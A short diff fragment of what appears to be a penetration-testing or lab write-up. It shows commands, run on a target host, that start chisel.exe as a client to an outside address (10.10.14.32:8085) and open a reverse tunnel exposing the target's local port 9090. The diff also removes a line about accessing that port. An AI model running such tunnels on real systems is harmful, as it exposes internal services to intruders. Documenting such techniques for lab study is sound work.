@@ -405,5 +405,3 @@ On target:
 execute -f ".\chisel.exe" -a "client  10.10.14.32:8085 R:9090:127.0.0.1:9090" -i
 .\chisel.exe client  10.10.14.32:8085 R:9090:127.0.0.1:9090
 ```
-
-Access http://127.0.0.1:9090
